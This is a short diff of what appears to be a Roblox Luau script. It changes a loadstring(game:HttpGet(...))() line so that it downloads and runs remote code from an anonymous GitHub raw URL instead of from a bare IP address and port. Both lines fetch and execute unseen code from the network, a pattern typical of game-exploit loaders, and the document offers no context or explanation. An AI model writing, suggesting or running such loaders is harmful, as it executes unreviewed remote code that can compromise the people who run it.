@@ -1,2 +1,2 @@
 ID="dfc6b814-9cac-49ef-8afe-1555a227fb3b";
-loadstring(game:HttpGet("http://109.71.240.235:3910/cdn/loader.luau"))()
+loadstring(game:HttpGet("https://raw.githubusercontent.com/balasotojerlyn57-ai/Balasoto-/refs/heads/main/Ggs%20script"))()
